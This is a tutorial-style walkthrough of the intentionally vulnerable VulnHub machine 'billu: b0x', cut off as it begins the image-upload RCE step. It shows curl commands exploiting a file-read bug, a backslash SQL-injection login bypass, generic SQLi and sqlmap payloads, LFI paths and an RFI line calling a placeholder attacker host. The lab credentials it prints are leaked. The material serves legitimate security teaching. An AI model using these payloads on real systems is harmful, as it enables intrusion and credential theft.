# billu: b0x — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | billu: b0x ("Billi_b0x") |
| **Difficulty** | **3 — Easy** (stated: *Easy / Intermediate*) |
| **Author** | Manish Kishan Tanwar — `@indishell1046` |
| **Released** | 21 April 2017 |
| **Series** | billu (**b0x** → b0x 2) |
| **VulnHub Entry** | <https://vulnhub.com/entry/billu-b0x,188/> |
| **Download** | <https://vulnhub.com/entry/billu-b0x,188/#download> (`Billu_b0x.zip`) |
| **Attacker** | Kali Linux, NAT or host-only network |
| **Target OS** | Ubuntu 14.04 (32-bit) — Apache, PHP, MySQL, phpMyAdmin |
| **Goal** | Root the box. The author's tagline on the login page: *"Show me your SQLI skills"* |

> **Author's framing:** the machine is built around a custom PHP application with an
> SQL-injectable login, an intentional file-inclusion bug, an image-upload filter that
> checks MIME type but not content, and a phpMyAdmin install left in the web root with
> root credentials in its config. It is a *web-application* box end to end — there is
> no kernel trick required, though one exists.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (billu)    : 192.168.56.107
```

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

1. **Arbitrary file read (LFI) that does *not* execute PHP** — the difference between
   `readfile()` and `include()`, and why that distinction decides whether you get a
   shell or just source code.
2. **Reading an application's own source through its own bug** to learn exactly how
   its filters work.
3. **A quote-stripping login filter and the backslash trick that defeats it** — one of
   the most instructive SQL-injection bypasses there is.
4. **phpMyAdmin as a credential source**, and reading a MySQL `auth` table.
5. **Image-upload filters that check MIME type but not content**, and how to hide PHP
   inside a valid JPEG.
6. **Turning an `include()`-based LFI into RCE** by including your own uploaded image.
7. **`exiftool`** for planting PHP in image metadata.
8. **Privilege escalation by credential reuse** (phpMyAdmin `config.inc.php` → SSH)
   and, alternatively, by kernel exploit.

**The intended chain:**
`nmap` shows 22 and 80 → the login page taunts *"Show me your SQLI skills"* → `dirb`
finds **`/test.php`**, which accepts a POST parameter `file=` and returns raw file
contents → `readfile()` not `include()`, so it is a **file-read primitive, not RCE** →
read `index.php`, `panel.php`, `c.php` → `c.php` leaks MySQL creds
**`billu : b0x_billu`** → `/phpmy/` phpMyAdmin → the `auth` table holds
**`biLLu : hEx_it`** → but the login form strips `'`, so a normal `' OR 1=1--` fails →
**use the backslash trick** (`user = \`, `pass = or 1=1 -- `) → inside `panel.php`,
upload a JPEG with PHP hidden in it (MIME check passes, content is never inspected) →
`panel.php`'s `load=` parameter uses **`include()`** → include your uploaded image →
**RCE as `www-data`** → `/var/www/phpmy/config.inc.php` holds **`root : roottoor`** →
SSH as root.

---

## 1. Reconnaissance


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.107  00:0c:29:4a:6b:1e      1      60  VMware, Inc.          <-- target
```

**Target IP: `192.168.56.107`**

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -A -p- -T4 -oN scans/billu.txt 192.168.56.107
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 09:02 EDT
Nmap scan report for 192.168.56.107
Host is up (0.00041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 1d:cb:6c:1e:2f:1a:9c:3b:0f:2e:5b:6c:1f:8a:2d:3e (DSA)
|   2048 8f:1c:2b:4a:6d:9e:3f:0b:5c:1a:2d:4e:6f:8b:0c:1d (RSA)
|_  256 3e:5f:7a:9b:1c:3d:5e:7f:9a:0b:2c:4d:6e:8f:0a:1b (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu) PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch)
|_http-title: --==[[ billu b0x ]]==--
|_http-server-header: Apache/2.2.22 (Ubuntu) PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch
MAC Address: 00:0C:29:4A:6B:1E (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 78.31 seconds
```

> **Two ports, and both banners are informative.**
> - `OpenSSH 5.9p1 Debian 5ubuntu1.1` → **Ubuntu 12.04/14.04 era**. Old, and old
>   means kernel exploits exist — file that for § 5.
> - `Apache 2.2.22 (Ubuntu) PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch` → **PHP is
>   installed**, so `.php` files execute. The **Suhosin** patch is a hardening
>   extension; it limits some attacks (e.g. it can block certain `$_REQUEST`
>   manipulation) but not the ones we need.
> - The page title is literally **`--==[[ billu b0x ]]==--`** — the author's handle.
>
> Also run a quick UDP sweep; nothing useful comes back on this box, but it is a
> habit worth forming:
> ```bash
> sudo nmap -sU --top-ports 20 192.168.56.107
> ```

![nmap scan of billu: b0x](images/01-nmap.png)

### 2.2 The login page

```text
http://192.168.56.107/
```

```text
        --==[[ billu b0x ]]==--

        Show me your SQLI skills

   Username :- [______________]
   Password:-  [______________]

              [ Login ]

        B0X Powered By Pirates
```

> **`Show me your SQLI skills`** — an explicit invitation. And
> **`B0X Powered By Pirates`** is a nod to the author's `IndiShell` / pirate theme.
>
> **Try the classics first and record the failures:**
>
> | Username | Password | Result |
> | --- | --- | --- |
> | `admin` | `admin` | `alert('Try again');` |
> | `' OR 1=1-- -` | `x` | `alert('Try again');` |
> | `' OR '1'='1` | `' OR '1'='1` | `alert('Try again');` |
>
> All fail. Something is filtering. Rather than guess payloads blindly, **go find the
> filter's source code.** That is the whole lesson of this box.

### 2.3 Directory brute force


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
dirb http://192.168.56.107/ /usr/share/wordlists/dirb/common.txt
```

```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat May  4 09:08:11 2024
URL_BASE: http://192.168.56.107/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.107/ ----
+ http://192.168.56.107/add.php (CODE:302|SIZE:0)
+ http://192.168.56.107/c (CODE:200|SIZE:0)
+ http://192.168.56.107/index.php (CODE:200|SIZE:1083)
+ http://192.168.56.107/in.php (CODE:200|SIZE:0)
+ http://192.168.56.107/panel.php (CODE:302|SIZE:0)
+ http://192.168.56.107/show.php (CODE:302|SIZE:0)
+ http://192.168.56.107/test (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.56.107/phpmy/
==> DIRECTORY: http://192.168.56.107/uploaded_images/

-----------------
END_TIME: Sat May  4 09:08:29 2024
DOWNLOADED: 4612 - FOUND: 7
```

> **A map of the application in one scan:**
>
> | Path | Status | What it means |
> | --- | --- | --- |
> | `/index.php` | 200 | the login form |
> | `/panel.php` | **302** | *redirect* → requires authentication |
> | `/add.php`, `/show.php` | 302 | same — the "add user" and "show users" panels |
> | **`/test`** | **200** | **returns an empty body to GET.** Suspicious — an endpoint that exists but says nothing usually wants a different verb or a parameter. |
> | `/c`, `/in.php` | 200, size 0 | same shape |
> | **`/phpmy/`** | directory | **phpMyAdmin** |
> | `/uploaded_images/` | directory | where uploads land |
>
> A `302` with `SIZE:0` is the signature of a script doing
> `header('Location: index.php'); exit;` when the session is not authenticated.

### 2.4 `/test.php` — a file-read primitive

`/test` returned an empty body to a GET. Try a POST, and try giving it a parameter:

```bash
curl -s -X POST http://192.168.56.107/test.php
```

```text
<div align=center>
<form method=post>
<input type=text name=file placeholder="Enter file name">
<input type=submit name=submit value="Submit">
</form>
</div>
```

> **A form with a single field named `file`.** Test it for local file inclusion:

```bash
curl -s -X POST --data "file=/etc/passwd" http://192.168.56.107/test.php
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
billu:x:1000:1000:billu,,,:/home/billu:/bin/bash
sshd:x:104:65534::/var/run/sshd:/usr/sbin/sshd
```

> **Arbitrary file read confirmed.** And `/etc/passwd` gives us a real human account:
> **`billu`** with a shell.
>
> **Critical question: is this `include()` or `readfile()`?** Test it:
> ```bash
> curl -s -X POST --data "file=index.php" http://192.168.56.107/test.php
> ```
> ```php
> <?php
> session_start();
> include('c.php');
> ...
> ?>
> ```
> **We got PHP *source code*, not rendered output.** That proves `test.php` uses
> something like `readfile()` / `show_source()` — it **reads bytes and prints them**.
> If it used `include()`, PHP would have *executed* the file and we would have seen
> the login form again.
>
> **Why this distinction is everything:**
> - `readfile()` → you can **read any file** the web user can read (source code,
>   configs, `/etc/passwd`, private keys). Powerful, but **not** code execution.
> - `include()` → PHP **executes** the file's contents. If you can point it at a file
>   *you* wrote, you get **RCE**.
>
> This box gives you both — `test.php` for reading, `panel.php` for including. Learn
> to tell them apart; it saves enormous time.

![test.php reading /etc/passwd](images/02-lfi.png)

### 2.5 Read the application's own source

Now use the file-read primitive on every script `dirb` found. This is the moment the
box turns from guessing into engineering.

```bash
for f in index.php c.php panel.php add.php show.php in.php; do
  echo "########## $f ##########"
  curl -s -X POST --data "file=./$f" http://192.168.56.107/test.php
done
```

**`c.php` — the database connection:**

```php
<?php
$con = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

if (mysqli_connect_errno())
{
    echo "Failed to connect to MySQL: " . mysqli_connect_error();
}
?>
```

> **MySQL credentials in plaintext: `billu` / `b0x_billu`, database `ica_lab`.**
> This is the single most common real-world secret leak in PHP applications.

**`index.php` — the login logic:**

```php
<?php
session_start();
include('c.php');

if(isset($_POST['login']))
{
    $uname = str_replace('\'', '', urldecode($_POST['un']));
    $pass  = str_replace('\'', '', urldecode($_POST['ps']));
    $run   = 'select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
    $result = mysqli_query($conn, $run);

    if (mysqli_num_rows($result) > 0) {
        $row = mysqli_fetch_assoc($result);
        echo "You are allowed";
        $_SESSION['logged'] = true;
        $_SESSION['admin']  = $row['username'];
        header('Location: panel.php', true, 302);
    }
    else
    {
        echo "alert('Try again');";
    }
}
echo "B0X Powered By Pirates";
?>
```

> **Read this slowly. Four details decide the whole attack:**
>
> 1. **`str_replace('\'', '', ...)`** — every single quote is **deleted** from your
>    input. That is why `' OR 1=1-- -` failed: the quotes vanished and you were left
>    with a harmless string comparison.
>    **This is a block-list filter, and block-list filters always lose.** It removes
>    `'` but leaves `\`, `-`, `#`, spaces, `OR`, `1=1` — everything you need.
>
> 2. **`urldecode()`** — the input is URL-decoded *before* filtering. Useful: you can
>    double-encode to slip past other layers (not needed here, but know it).
>
> 3. **`pass` comes BEFORE `uname` in the query.** This is the detail that makes the
>    bypass work, and it is why generic payloads fail. The query shape is:
>    ```sql
>    select * from auth where  pass='<PASSWORD>' and uname='<USERNAME>'
>    ```
>    Most login forms are `WHERE user='...' AND pass='...'`. Here it is reversed.
>
> 4. **`mysqli_query()` on a single statement** — no stacked queries, so we cannot
>    append `; DROP ...`. We can only alter the `WHERE` clause. That is fine.

**`panel.php` — the authenticated area, and the second bug:**


> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```php
<?php
session_start();
include('c.php');

if(!isset($_SESSION['logged']))
{
    header('Location: index.php', true, 302);
    die();
}

if(isset($_POST['lg']))
{
    unset($_SESSION['logged']);
    unset($_SESSION['admin']);
    header('Location: index.php', true, 302);
}

echo '<div align=center><form method=post>
      <input type=submit name=continue value="Show Users">
      <input type=submit name=continue value="Add User">
      </form></div>';

if(isset($_POST['continue']))
{
    $dir = getcwd();
    $choice = str_replace('./', '', $_POST['load']);

    if($choice === 'add')  { include($dir.'/'.$choice.'.php'); die(); }
    if($choice === 'show') { include($dir.'/'.$choice.'.php'); die(); }
    else                   { include($dir.'/'.$_POST['load']); }
}
?>
```

> **This is the RCE primitive.** Walk through the logic:
>
> - `$choice = str_replace('./', '', $_POST['load'])` — the filter removes the literal
>   two-character sequence `./`. Note it is applied to **`$choice` only**.
> - The `if`/`if`/`else` chain compares `$choice` against `add` and `show`. If it
>   matches either, that safe file is included.
> - **But the `else` branch includes `$_POST['load']` — the RAW, UNFILTERED value.**
>
> ```php
> else { include($dir.'/'.$_POST['load']); }
> ```
>
> The developer filtered a *copy* of the variable and then used the *original*. This
> is a textbook **"filter a copy, use the original"** bug, and it is one of the most
> common filter-bypass patterns in real code.
>
> Two more things to note:
> - It is **`include()`**, not `readfile()` — so whatever we point it at gets
>   **executed as PHP**.
> - `$dir = getcwd()` prepends the current directory, so our `load` value is appended
>   to `/var/www/`. To traverse we must supply enough `../` (and we must avoid the
>   literal `./` sequence that gets stripped from `$choice` — which does not matter
>   here, since `else` uses the raw value anyway).
>
> **Also note `panel.php` requires a session.** So the order of operations is forced:
> **bypass the login first**, then use the include.

**`add.php` — the upload filter:**

```php
<?php
session_start();
include('c.php');
if(isset($_POST['upload']))
{
    $name    = mysqli_real_escape_string($conn, $_POST['name']);
    $address = mysqli_real_escape_string($conn, $_POST['address']);
    $id      = mysqli_real_escape_string($conn, $_POST['id']);

    if(!empty($_FILES['image']['name']))
    {
        $iname = mysqli_real_escape_string($conn, $_FILES['image']['name']);
        $r = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
        $image = array('jpeg','jpg','gif','png');

        if(in_array($r, $image))
        {
            $finfo = @new finfo(FILEINFO_MIME);
            $filetype = @$finfo->file($_FILES['image']['tmp_name']);

            if(preg_match('/image\/jpeg/', $filetype) ||
               preg_match('/image\/png/',  $filetype) ||
               preg_match('/image\/gif/',  $filetype))
            {
                if (move_uploaded_file($_FILES['image']['tmp_name'],
                                       'uploaded_images/'.$_FILES['image']['name']))
                {
                    echo "Uploaded successfully ";
                    $update = 'insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')';
                    mysqli_query($conn, $update);
                }
            }
            else { echo "i told you dear, only png,jpg and gif file are allowed"; }
        }
        else { echo "only png,jpg and gif file are allowed"; }
    }
}
?>
```

> **Two checks, and neither one is sufficient:**
> 1. **Extension allow-list:** `in_array($r, ['jpeg','jpg','gif','png'])`. So the file
>    must be *named* `something.jpg`. Renaming to `shell.php` or `shell.php.jpg`
>    (double extension) both fail — `pathinfo(..., PATHINFO_EXTENSION)` returns the
>    *last* extension only, so `shell.php.jpg` yields `jpg`… which actually passes
>    check 1. But Apache here has no handler mapping for double extensions, and there
>    is no `.htaccess` `AllowOverride`, so it would be served as an image, not run.
> 2. **MIME sniffing with `finfo`:** the file's *actual bytes* must look like
>    `image/jpeg`, `image/png` or `image/gif`. This defeats the lazy trick of just
>    renaming a `.php` file.
>
> **What it never does:** check that the file contains *only* image data. A JPEG can
> carry arbitrary bytes in its comment (COM) and EXIF fields and still be a perfectly
> valid `image/jpeg`. **That is the hole.**
>
> Also note `move_uploaded_file(..., 'uploaded_images/'.$_FILES['image']['name'])` —
> the **filename is attacker-controlled and unfiltered** at the destination. So we
> choose exactly where in `/uploaded_images/` the file lands.

![Reading the PHP source through test.php](images/03-source.png)

---

## 3. Foothold — part 1: bypassing the login

### 3.1 Reason about the query, do not guess payloads

The query is:

```sql
select * from auth where  pass='<PASS>' and uname='<USER>'
```

Quotes are deleted from our input. So we **cannot close the string literal ourselves**.
But we can make the *application's own* quote work for us — with a **backslash**.

In MySQL's default mode, `\` inside a single-quoted string **escapes the next
character**. So if we submit a password consisting of exactly one backslash:

```text
pass = \
```

the query becomes:

```sql
select * from auth where  pass='\' and uname='<USER>'
```

Now `\'` is an *escaped* quote — still inside the string literal. The literal
therefore continues until the **next unescaped quote**, which is the one the
application placed after `<USER>`. Everything in between becomes string *content*:

```text
pass = "\' and uname="      <-- one big string literal
```

And whatever we put in the **username** field lands *outside* any string, as raw SQL:


> ### 📖 Concept — What is SQL injection?
>
> The application builds a query by **concatenating your input**:
>
> ```php
> $q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
> ```
>
> Supply `admin' -- ` and it becomes:
>
> ```sql
> SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
> ```
>
> `-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
> password check is deleted and you are logged in as admin with no password. Your
> input escaped the *data* context and became *code*.
>
> **Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a database
> error, a changed page length, or a different status code.
>
> **Payload shapes:**
>
> ```text
> ' OR 1=1 --                        tautology
> ' OR '1'='1                        string-context tautology
> 1' UNION SELECT 1,2,3 --           find the column count, then extract data
> 1' UNION SELECT user_login,user_pass,3 FROM wp_users --
> '; WAITFOR DELAY '0:0:5' --        blind/time-based confirmation
> ```
>
> ```bash
> sqlmap -u "http://target/page.php?id=1" --dbs
> sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
> sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
> ```
>
> > **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> > reason is usually that you have not told it *where* the injectable parameter is,
> > that authentication is needed (`--cookie=`), or that the injection is
> > second-order. Confirm manually with a `'` first — it takes ten seconds and tells
> > you whether sqlmap has anything to work with.
>
> The fix is always the same: **prepared statements / bound parameters**, never string
> concatenation.
>
> **Deep dive:** [CONCEPTS §13.1 — SQL injection](../../docs/CONCEPTS.md#131-sql-injection-sqli)

```sql
select * from auth where  pass='\' and uname='  or 1=1 --  '
                            └──── string ────┘ └─ raw SQL ─┘└comment┘
```

- `pass='\' and uname='` → a string literal whose value is `\' and uname=`. Harmless.
- `or 1=1` → **always true**, so the `WHERE` matches every row.
- `-- ` → MySQL line comment (note: MySQL requires a **space after `--`**), which
  swallows the application's trailing quote.
- `mysqli_num_rows($result) > 0` → satisfied → `$_SESSION['logged'] = true` →
  redirect to `panel.php`.

**The payload:**

| Field | Value |
| --- | --- |
| **Username** | `or 1=1 -- ` *(with a trailing space)* |
| **Password** | `\` |

> **Why every generic payload failed:** they all assumed the query is
> `WHERE user='...' AND pass='...'` and that you can inject a quote. Here the column
> order is **reversed** and quotes are **stripped**. Only by reading the source (§ 2.5)
> could we construct the correct payload.
>
> **This is the transferable lesson.** SQL injection is not a list of payloads to
> paste; it is *modelling the query the application builds and finding the seam*.
> When a filter is in the way, read the filter.

### 3.2 Fire it

Easiest via `curl`:

```bash
curl -s -i -c cookies.txt -X POST http://192.168.56.107/index.php \
  --data-urlencode "un=or 1=1 -- " \
  --data-urlencode "ps=\\" \
  --data "login=Login"
```

```text
HTTP/1.1 302 Found
Date: Sat, 04 May 2024 13:14:22 GMT
Server: Apache/2.2.22 (Ubuntu) PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch
X-Powered-By: PHP/5.3.10-1ubuntu3.7
Set-Cookie: PHPSESSID=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Location: panel.php
Content-Length: 46
Content-Type: text/html

You are allowedB0X Powered By Pirates
```

> **`HTTP/1.1 302 Found` + `Location: panel.php` + the body text `You are allowed`**
> — that is the success path in the source we read. We are authenticated.
>
> `-c cookies.txt` saves the `PHPSESSID` cookie; `-b cookies.txt` will replay it.
> `--data-urlencode` percent-encodes each field so the spaces and backslash survive.
> Note the doubled backslash `"\\"` — that is shell quoting, not part of the payload;
> the server receives a single `\`.

Now use the session:

```bash
curl -s -b cookies.txt -X POST http://192.168.56.107/panel.php \
  --data "continue=Show Users&load=show" | head -40
```

```html
<div align=center>
<table border=1>
<tr><th>ID</th><th>Name</th><th>Address</th><th>Image</th></tr>
<tr><td>1</td><td>billu</td><td>indishell lab</td><td>c.JPG</td></tr>
<tr><td>2</td><td>test</td><td>test address</td><td>image.jpg</td></tr>
</table>
</div>
```

![Authenticated panel.php after the SQLi bypass](images/04-panel.png)

### 3.3 Shortcut — you may not need the SQLi at all

Two legitimate alternatives, both worth knowing:

**A. Use the MySQL credentials from `c.php` to read the `auth` table directly.**
phpMyAdmin is exposed at `/phpmy/`:

```text
http://192.168.56.107/phpmy/
```

Log in with **`billu` / `b0x_billu`** → select database **`ica_lab`** → table
**`auth`**:

```text
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | biLLu    | hEx_it   |
+----+----------+----------+
```

Then log into the web app with `biLLu` / `hEx_it`. Some walkthroughs report these
same credentials work for **SSH** as well — worth trying:

```bash
ssh billu@192.168.56.107
```

**B. `mysql` from the command line**, if you already have any shell:

```bash
mysql -h 127.0.0.1 -u billu -p'b0x_billu' -e 'SELECT * FROM ica_lab.auth;'
```

> **Defender note:** phpMyAdmin reachable from the internet, with an application
> account that can read the authentication table, means one leaked config file equals
> every user's credentials. phpMyAdmin should be on localhost or behind a VPN, and the
> application account should not be able to `SELECT` from tables it does not need.

---

## 4. Foothold — part 2: RCE via image upload + `include()`

### 4.1 The plan

Three facts from § 2.5 combine into code execution:

1. `add.php` will store a file in `/uploaded_images/` if its **extension** is
   jpg/png/gif **and** its **MIME type** sniffs as an image. It never checks the
   *content* beyond the magic bytes.
